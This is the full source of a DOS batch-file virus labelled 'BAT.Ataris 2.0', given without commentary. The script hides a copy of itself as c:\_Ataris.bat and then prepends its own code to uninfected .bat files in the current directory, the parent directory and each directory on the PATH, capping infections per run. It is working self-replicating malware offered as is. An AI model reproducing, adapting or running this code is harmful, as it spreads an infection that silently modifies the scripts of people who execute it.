::Ataris BAT.Ataris 2.0
@echo off%_Ataris%
if '%1=='Ataris goto Ataris%2
set Ataris=%0.bat
if not exist %Ataris% set Ataris=%0
if '%Ataris%==' set Ataris=autoexec.bat
if exist c:\_Ataris.bat goto Atarisg
if not exist %Ataris% goto eAtaris
find "Ataris"<%Ataris%>c:\_Ataris.bat
attrib c:\_Ataris.bat +h
:Atarisg
command /e:5000 /c c:\_Ataris Ataris vir . .. %path%
:eAtaris
set Ataris=
goto Atarisend
:Atarisvir
shift%_Ataris%
if '%2==' exit %Ataris%
for %%a in (%2\*.bat %2*.bat) do call c:\_Ataris Ataris i %%a
goto Atarisvir
:Atarisi
find "Ataris"<%3>nul
if not errorlevel 1 goto Atarisj
type c:\_Ataris.bat>Ataris$
type %3>>Ataris$
move Ataris$ %3>nul
set Ataris#=%Ataris#%1
if %Ataris#%==111 exit
:Atarisj
set Ataris!=%Ataris#%1
if %Ataris!%==11111111111111111111 exit
:Atarisend
::**** HOST ****

